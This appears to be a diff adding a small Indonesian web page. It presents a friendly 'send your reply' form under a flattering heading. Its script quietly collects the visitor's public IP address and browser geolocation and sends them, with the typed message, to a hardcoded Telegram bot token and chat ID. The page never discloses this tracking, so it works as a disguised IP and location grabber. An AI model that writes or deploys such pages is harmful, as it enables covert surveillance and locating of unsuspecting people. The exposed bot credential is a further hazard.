@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form Kirim ke Telegram</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f9f9f9; padding: 20px; }
+        form { background: white; padding: 20px; border-radius: 8px; max-width: 400px; margin: auto; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        label { display: block; margin: 10px 0 5px; }
+        textarea { width: 100%; padding: 10px; height: 100px; margin-bottom: 15px; }
+        button { padding: 10px 20px; background-color: #007BFF; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        button:hover { background-color: #0056b3; }
+        h3 { backround-color: #0056b3; }
+    </style>
+</head>
+<body>
+  <h3>you are always beautiful all day long</h3>
+<h5>Kirim Balasan</h2>
+<form id="telegramForm">
+    <label for="pesan">Balasan Anda:</label>
+    <textarea id="pesan" name="pesan" required></textarea>
+    <button type="submit">Kirim Balasan</button>
+</form>
+
+<script>
+    // Ganti dengan Token Bot dan Chat ID kamu
+    const botToken = '7558386866:AAHDkaNEi3Tw7_5ew4LOedzfmf7a7hfioEA'; // Ganti dengan Token Bot kamu
+    const chatId = '7233342888'; // Ganti dengan Chat ID kamu
+
+    // Fungsi untuk mendapatkan IP publik
+    function getPublicIP() {
+        return fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => data.ip)
+            .catch(() => 'IP tidak tersedia');
+    }
+
+    // Fungsi untuk mendapatkan lokasi
+    function getLocation() {
+        return new Promise((resolve, reject) => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        resolve(`Latitude: ${latitude}, Longitude: ${longitude}`);
+                    },
+                    () => resolve('Lokasi tidak tersedia')
+                );
+            } else {
+                resolve('Geolocation tidak didukung');
+            }
+        });
+    }
+
+    // Event saat form dikirim
+    document.getElementById('telegramForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        const pesanUser = document.getElementById('pesan').value;
+        const ip = await getPublicIP();
+        const lokasi = await getLocation();
+
+        const message = `📩 Pesan Baru:\n\nPesan: ${pesanUser}\nIP: ${ip}\nLokasi: ${lokasi}`;
+
+        // Kirim pesan ke Telegram
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                alert('Pesan berhasil dikirim ke Telegram!');
+                document.getElementById('telegramForm').reset();
+            } else {
+                alert('Gagal mengirim pesan. Coba lagi.');
+            }
+        })
+        .catch(() => alert('Terjadi kesalahan saat mengirim pesan.'));
+    });
+</script>
+
+</body>
+</html>
